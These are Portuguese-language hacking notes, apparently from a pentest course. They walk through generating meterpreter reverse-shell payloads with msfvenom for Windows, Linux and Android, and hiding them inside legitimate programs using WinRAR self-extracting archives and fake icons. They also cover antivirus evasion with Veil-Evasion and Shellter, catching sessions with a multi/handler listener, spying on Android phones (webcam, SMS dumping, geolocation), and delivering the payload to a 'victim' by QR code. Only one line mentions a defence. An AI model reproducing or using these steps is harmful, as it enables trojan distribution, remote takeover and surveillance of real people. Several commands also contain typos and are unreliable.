-O msfvenon constroy payloads que possibilitam exploração em alvos
	-Verificando payloads disponiveis:
	#msfvenon --payload
	
	-Payload meterpreter para windows:
	#msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.112 -lport=443 -f exe > /var/www/html/Game.exe
	#msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.112 -lport=443 -f exe > /var/www/html/Game.exe #Caso a antivirus detecte
	#msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.1.112 -lport=443 -f exe > /var/www/html/Game.exe #Caso o antivirus detecte
	
	-Enviar o arquivo para a vitima:
	
	-Abrir o msfconsole
	#msfconsole
	
	-Usar o Exploit exploit/multi/handler
	#use exploit/multi/handler

	-Usar o payload que criamos o arquivo malicioso:
	#set payload windows/meterpreter/reverse_tcp
		-Caso tenha configurado outro payload no arquivo, usar o mesmo
	#set lport 443
	#set lhost 192.168.1.112
	
	-Executar o exploit e aguardar ate a vitima abrir o arquivo
	#exploit

	-Apos ganhar o meterpreter da maquina, 

-NORMALMENTE os ANTIVIRUS detectam o arquivo malicioso, da forma que foi criada (virustotal.com)
	-O virustotal é um banco de dados que varios anti virus consultam





---TROJAN
	-Inserir virus em arquivo legitimo

	-Por exemplo infectando um arquivo portable (Navegador, aplicativo, team viewer, jogo etc)

	-Para infectar um arquivo legitimo é necessario dois aplicativos:
		-WinRar
		-ResHacker

	-É necessario ter o aplicativo Legitimo e o arquivo infectado gerado no msfvenon
		-Botao direito selecionando o arquivo infectado e o arquivo legitimo
		-Adicionar para arquivo
		-Criar arquivo SFX (TextBox)
		-Avançado > Opções SFX > Geral > Caminho para extração > c:\windows\system32
		-Avançado > Opções SFX > Configuração > Executar depois da extração > arquivoInfetado.exe arquivoLegitimo.exe
		-Avançado > Opções SFX > Configuração > metodos > Ocultar tudo
		-Avançado > Opções SFX > atualizar > Substituir todos os arquivos

	-Sera gerado um arquivo compactado, que ao descompactar ira infectar o computador
	-Usar o ResHacker para alterar o Icone do arquivo gerado
		-Baixar uma imagem do arquivo original
		-File > Open > ArquivoGerado
		-Action > Replace icon > IconeAplicativo original		
		-Save As

	-Após esse processo, sera criado o arquivo malicioso, e a vitima ira executar normalmente, porem, com o Trojan abrindo a sessao meterpreter no PC ATACANTE



---

-É possivel encriptar os arquivos gerados pelo msfvenon para ficarem com mais baixa detecção pelos antivirus, com o veil-evasion
	#apt-get install veil-evasion
	#vail-evasion
	#update

	-Veerificar payloads:
	#list
	
	-Usar payloads de criptogrfia eas_encypt
	#32
	#set USE_PYHERION Y
	#generate
	-Gerar usando o msfvenon
	#1
	-Selecionar o payload:
	#windows/meterpreter/reverse_tcp
	-Set LHOST
	-Set LPORT
	-ENTER
	-Definir o nome do arquivo: arquivo
	#1

	-O Arquivo estara disponivel em /var/lib/veil-evasion/output/compiled

	-Automaticamente sera gerado um arquivo Handler, que ira aguardar a execução do arquivo malicioso
		-Arquivos .rc, são abertos via msfconsole
		#msfconsole -r arquivo.rc



-Pode ser uado o shellter tambem, para burlar detecção de anti virus
	#apt-get install shellder
	#dpkg --add-architecture i386 && apt-get update && apt-get install wine32
	
	-Esse aplicativo permite encryptar um arquivo legitimo com um shellcode trojan

	-Executando a ferramenta:
	#shellter
	#A
	#/var/www/html/arqLegitimo.exe
	#L  (Para selecionar um payload listado)
	#1
	#LHOST 
	#LPORT
	#ENTER

	-O arquivo sera gerado, e um arquivo de backup estara disponivel .bak

	-Abrir o msfconsole para receber a conexão do arquivo quando executado
	#msfconsole
	#use exploit/multi/handler
	#set payload windows/meterpreter/reverse_tcp
	#set lhost
	#set lport
	#exploit



___OBS: Para se proteger desse ataque, é sempre bom verificar o md5sum do arquivo original, informado no site


--

-Gerando arquivo malicioso para LINUX
	#msfvenon -p linux/x86/meterpreter/reverse_tcp lport=443 lport=192.168.1.112 -f elf > executavel
	
-Gerando arquivo para ANDROID
	#msfvenon -p android/meterpreter/reverse_tcp lport=443 lport=192.168.1.112 R > executavel.apk
	
	-Para o meterpreter de dispositivos android, é interessante o uso das opções
		-webcam_*
		-geolocate
		-wlan_geolocate
		-send_sms
		-dump_sms


-Disponibilizando o ARQUIVO via QR Code:
	#setoolkit
	#1
	#8
	#http://192.168.1.112/executavel.apk

	-Disponibilizer o QR Code via pagina, ou afins


